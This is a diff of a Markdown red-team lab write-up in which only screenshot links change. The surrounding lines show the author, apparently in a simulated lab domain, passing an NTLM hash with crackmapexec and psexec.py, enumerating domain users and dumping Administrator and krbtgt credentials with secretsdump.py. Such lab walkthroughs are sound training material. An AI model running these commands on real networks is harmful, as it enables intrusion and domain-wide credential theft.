@@ -358,7 +358,8 @@ proxychains poetry run crackmapexec smb 10.10.10.2 -u 'child-admin' -H :dbac2b57
 
 Nice, I got the Pwn3d! and found out that 10.10.10.2 is the domain controller named RED-CHILDDC running on Windows Server 2016 Standard 14393 x64.
 
-![Screenshot 2023-07-08 at 7 58 29 PM](https://github.com/JFPineda79/Red-Team-Simulation-1/assets/96193551/03027ab0-7090-41a3-8b81-df52f0c996e7)
+![Screenshot 2023-07-08 at 7 58 29 PM](https://github.com/JFPineda79/Red-Team-Engagement-Simulation/assets/96193551/e271d793-fcb8-4edf-a020-8656b02e6fed)
+
 
 | External IP Address | Description |
 | --- | --- |
@@ -379,7 +380,7 @@ Using the psexec.py, the child-admin hash and with our active proxy running on 1
 ```bash
 proxychains psexec.py child.redteam.corp/child-admin@10.10.10.2 -hashes :dbac2b57a73bb883422658d2aea36967
 ```
-![Screenshot 2023-07-08 at 8 07 11 PM](https://github.com/JFPineda79/Red-Team-Simulation-1/assets/96193551/79cdd815-38a6-439e-b2d1-6923dedab8bf)
+![Screenshot 2023-07-08 at 8 07 11 PM](https://github.com/JFPineda79/Red-Team-Engagement-Simulation/assets/96193551/b9d38488-5289-4b22-816c-46d55aca1baf)
 
 There, I got successfully accessed it. 
 
@@ -389,7 +390,7 @@ net user /domain
 
 Enumerating more further on the machine, I can see more domain users.
 
-![Screenshot 2023-07-08 at 8 59 30 PM](https://github.com/JFPineda79/Red-Team-Simulation-1/assets/96193551/a30ecf73-6965-4f22-a78f-4f7effbccf33)
+![Screenshot 2023-07-08 at 8 59 30 PM](https://github.com/JFPineda79/Red-Team-Engagement-Simulation/assets/96193551/faf5d360-1ae4-4750-bc45-1300b5eb3bcb)
 
 # Moving to DC
 
@@ -400,13 +401,13 @@ To look more information on my target domain controller, I will use the secretsd
 ```bash
 proxychains secretsdump.py child.redteam.corp/child-admin@10.10.10.2 -hashes :dbac2b57a73bb883422658d2aea36967
 ```
-![Screenshot 2023-07-08 at 8 23 21 PM](https://github.com/JFPineda79/Red-Team-Simulation-1/assets/96193551/0eff594b-d649-4bfe-a7d4-975ac5c58046)
+![Screenshot 2023-07-08 at 8 23 21 PM](https://github.com/JFPineda79/Red-Team-Engagement-Simulation/assets/96193551/fff29d6f-b936-4b0a-a217-95274e308f7d)
 
 Great, I got the Administrator credential and other more machine part of this domain.
 
 Also I got the krbtgt credentials as well.
 
-![Screenshot 2023-07-08 at 8 28 08 PM](https://github.com/JFPineda79/Red-Team-Simulation-1/assets/96193551/1ba1af26-971f-4e81-941a-09c95a807650)
+![Screenshot 2023-07-08 at 8 28 08 PM](https://github.com/JFPineda79/Red-Team-Engagement-Simulation/assets/96193551/be7978f3-9505-4f2d-bb5e-bd19d216051c)
 
 ## secretsdump.py -debug
 
